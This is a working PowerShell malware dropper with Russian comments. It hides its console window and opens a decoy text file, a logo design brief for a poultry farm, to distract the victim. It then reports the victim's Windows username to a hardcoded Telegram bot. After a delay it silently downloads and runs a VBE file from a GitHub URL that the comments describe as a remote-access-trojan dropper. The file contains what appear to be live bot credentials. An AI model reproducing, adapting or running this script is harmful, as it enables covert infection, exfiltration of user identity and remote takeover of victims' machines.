# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "ТЗ цвета и идеи логотипа СИНЯВИНСКАЯ.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Техзадание: цвета и наброски логотипа для Синявинской птицефабрики

Цвета:
*   Главные: #E10600 (красный), #FFD400 (жёлтый)
*   Обычные: #FFFFFF (белый), #000000 (чёрный)
*   Дополнительные (если надо): #FF8C00 (оранжевый), #8B5A2B (коричневый)

Идеи для лого:
1.  Цыплёнок сбоку: простой силуэт, чёткие линии, чтобы хорошо смотрелся даже маленьким.
2.  Цыплёнок из яйца: скорлупка и выглядывающий цыплёнок, чтобы упаковка выглядела мило.
3.  Курица с яйцами: как курица защищает яйца, чтобы показать заботу и качество.
4.  Яйцо с буквой С: просто контур яйца, а внутри буква С (Синявинская) – понятно и запоминается.
5.  Курица и зерно: курица вокруг зерна, чтобы все понимали, что корм натуральный.
6.  Цыплёнок попроще: совсем простой значок для всяких иконок.
7.  Круглый значок: круг или щит, а там курица и надпись Синявинская. Для наклеек и печати.
8.  Всё вместе: картинка и слоган на ленте. Яйцо или цыплёнок слева, а текст справа.

Шрифты (выбирайте из этих четырёх, они все на русском, укажите вес в макетах):

*   Montserrat (лучше всего для лого и заголовков): для значка берите 700/800, для заголовков – 500/600.
*   Rubik (если хотите что-то помягче): 500/700.
*   Inter (для подзаголовков): 400/600.
*   PT Sans (для обычного текста и таблиц): 400/700.

Как использовать цвета:
*   Красный (#E10600) – самый важный цвет для логотипа.
*   Жёлтый (#FFD400) – для фона и чтобы выделить что-то, он хорошо сочетается с красным.
*   Белый/чёрный – для текста.
*   Нужна чёрно-белая версия лого и такая, чтобы хорошо смотрелась на тёмном фоне.
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit